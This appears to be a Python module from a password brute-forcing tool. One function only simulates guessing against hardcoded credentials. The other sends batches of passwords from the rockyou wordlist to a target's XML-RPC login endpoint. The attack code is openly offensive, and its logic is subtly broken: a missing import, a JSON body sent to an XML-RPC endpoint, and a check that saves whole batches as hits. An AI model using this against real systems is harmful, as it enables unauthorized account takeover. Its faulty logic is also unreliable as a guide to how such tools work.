import requests
from utils.xmlrpc_utils import build_multicall_payload
from utils.logger import save_hit, log_event
from config import WORDLIST_DIR

def brute_force_login(url):
    usernames = ["admin", "root", "user"]
    passwords = ["123456", "password", "admin"]

    results = [f"[*] Brute forcing {url}...\n"]

    for user in usernames:
        for pwd in passwords:
            if user == "admin" and pwd == "admin":
                results.append(f"[+] Valid credentials found: {user}:{pwd}")
                log_event("brute", {"target": url, "result": "success", "user": user, "password": pwd})
                return "\n".join(results)

            results.append(f"[-] Tried {user}:{pwd}")

    results.append("[!] No valid credentials found.")
    log_event("brute", {"target": url, "result": "fail"})
    return "\n".join(results)

def xmlrpc_brute(target_url, username):
    wordlist_path = os.path.join(WORDLIST_DIR, "rockyou.txt")
    session = requests.Session()

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            while True:
                batch = [line.strip() for _, line in zip(range(10), f)]
                if not batch:
                    break

                payload = build_multicall_payload(username, batch)
                response = session.post(target_url, json=payload)

                if "faultCode" not in response.text:
                    for pwd in batch:
                        if "incorrect" not in response.text:
                            save_hit(username, pwd)
    except Exception as e:
        print(f"[!] Error during XMLRPC brute: {e}")
